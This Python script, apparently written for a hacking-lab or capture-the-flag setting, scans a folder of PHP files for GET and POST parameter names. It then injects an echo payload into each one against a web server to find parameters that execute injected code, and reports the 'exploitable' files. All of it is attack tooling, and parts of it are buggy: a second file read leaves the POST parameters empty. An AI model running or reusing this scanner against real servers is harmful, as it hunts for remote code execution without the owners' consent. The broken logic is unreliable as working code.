import os
import threading
import requests
import re
import time

filePath = r"C:\Users\kt21\Downloads\IDM\www\src"
os.chdir(filePath)
files = os.listdir(filePath)

thread_ = threading.Semaphore(100)
requests.adapters.DEFAULT_RETRIES = 5
session = requests.Session()
session.keep_alive = False

max_try = 20


def getContent(file):
    print(file + " is testing")
    thread_.acquire()
    with open(file, encoding='utf-8') as f:
        gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
        posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))
    params = {}
    data = {}
    for g in gets:
        params[g] = "echo 'ppp_qqq';"
    for p in posts:
        data[p] = "echo 'ppp_qqq';"

    url = 'http://192.168.160.128/src/' + file
    req = session.post(url, data=data, params=params)
    req.encoding = 'utf-8'
    content = req.text
    req.close()

    if 'ppp_qqq' in content:
        flag = ''
        for g in gets:
            req = session.get(url + "?%s=echo 'ppp_qqq';" % g)
            content = req.text
            req.close()
            if 'ppp_qqq' in content:
                flag = g
                break
        if len(flag) != 0:
            for p in posts:
                req = session.post(url, data={p: "echo 'ppp_qqq';"})
                content = req.text
                req.close()
                if 'ppp_qqq' in content:
                    flag = p
                    break

        print('找到了利用文件:' + file + '  利用参数:' + flag)
    thread_.release()


if __name__ == '__main__':
    print("start")
    for file in files:
        time.sleep(0.02)  #加个延时
        t = threading.Thread(target=getContent, args=(file,))
        t.start()